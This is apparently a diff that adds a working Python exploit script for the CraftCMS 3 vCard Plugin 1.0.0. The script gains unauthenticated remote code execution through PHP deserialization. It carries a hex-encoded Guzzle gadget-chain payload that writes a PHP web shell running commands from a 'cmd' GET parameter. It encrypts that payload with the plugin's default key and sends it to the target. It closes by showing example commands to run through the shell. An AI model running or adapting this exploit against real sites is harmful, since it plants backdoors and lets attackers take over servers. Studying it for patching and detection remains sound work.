@@ -1,0 +1,60 @@
+# Exploit Title: CraftCMS 3 vCard Plugin 1.0.0 - Remote Code Execution
+# Date: 2020-05-18
+# Exploit Author: Wade Guest
+# Vendor Homepage: https://craftcms.com/
+# Software Link: https://plugins.craftcms.com/vcard
+# Vulnerability Details: https://gitlab.com/wguest/craftcms-vcard-exploit
+# Version: 1.0.0
+# Tested on: Ubuntu 19.10 / PHP 7.3.11
+# Description: CraftCMS 3 vCard Plugin 1.0.0 - Deserialization to RCE
+
+#!/usr/bin/env python3
+
+import sys
+import argparse
+import subprocess
+import requests
+
+DEFAULT_PAYLOAD = "613a323a7b693a373b4f3a33313a2247757a7a6c65487474705c436f6f6b69655c46696c65436f6f6b69654a6172223a343a7b733a34313a220047757a7a6c65487474705c436f6f6b69655c46696c65436f6f6b69654a61720066696c656e616d65223b733a%s3a222e2f%s223b733a35323a220047757a7a6c65487474705c436f6f6b69655c46696c65436f6f6b69654a61720073746f726553657373696f6e436f6f6b696573223b623a313b733a33363a220047757a7a6c65487474705c436f6f6b69655c436f6f6b69654a617200636f6f6b696573223b613a313a7b693a303b4f3a32373a2247757a7a6c65487474705c436f6f6b69655c536574436f6f6b6965223a313a7b733a33333a220047757a7a6c65487474705c436f6f6b69655c536574436f6f6b69650064617461223b613a333a7b733a373a2245787069726573223b693a313b733a373a2244697363617264223b623a303b733a353a2256616c7565223b733a36373a223c7072653e3c3f70687020696628697373657428245f4745545b27636d64275d2929207b2073797374656d28245f4745545b27636d64275d293b202020207d203f3e0a223b7d7d7d733a33393a220047757a7a6c65487474705c436f6f6b69655c436f6f6b69654a6172007374726963744d6f6465223b4e3b7d693a373b693a373b7d"
+
+def generatePayload(fname):
+	fname_hex = str(fname).encode('utf-8').hex()
+	fname_len_hex = str(len(fname)+2).encode('utf-8').hex()
+	payload = DEFAULT_PAYLOAD % (fname_len_hex,fname_hex)
+	return payload
+
+
+def exploitCard(url,payload):
+	malicious_url = url + payload.decode()
+	r = requests.get(malicious_url,verify=False)
+
+	return r.status_code
+
+def encryptPayload(payload,salt):
+	phpcomm = """$string=hex2bin("%s");$key = "%s";$key = md5( $key );$iv = substr( md5( $key ), 0, 16);echo rtrim(strtr(base64_encode(openssl_encrypt( $string, "aes128", md5( $key ), true, $iv )),"+/", "-_"), "=");""" % (payload,salt)
+	result = subprocess.run(['php','-r',phpcomm],stdout=subprocess.PIPE)
+	return result.stdout
+
+
+def main():
+	parser = argparse.ArgumentParser(description="Unauthenticated RCE for CraftCMS vCard Plugin")
+	parser.add_argument('-u',dest='url',required=True,help="The URL for the vCard download without the vCard value\nExample: http://craftcms/index.php?p=actions/vcard/default/index&vcard=")
+	parser.add_argument('-s',dest='salt',default="s34s4L7",help="Security key required for encrypting payload. Defaul is 's34s4L7'")
+	parser.add_argument('-f',dest='fname',default="shell.php",help="File path/name to use as value in upload path: ./<value> . Use a PHP extension. Default value is 'shell.php'")
+
+	if len(sys.argv)<3:
+		parser.print_help()
+		sys.exit(0)
+
+	args = parser.parse_args()
+
+	attPayload = generatePayload(args.fname)
+
+	serPayload = encryptPayload(attPayload,args.salt)
+	if exploitCard(args.url,serPayload) == 500:
+            print("Deserialization has been triggered, navigate to craftCMS webroot/"+ args.fname +"\nUse GET parameter 'cmd' to execute commands\nExample: https://craftcms/"+ args.fname +"?cmd=ls%20-al;whoami;ip%20a\n")
+
+
+if __name__ == '__main__':
+	main()
+	sys.exit(0)
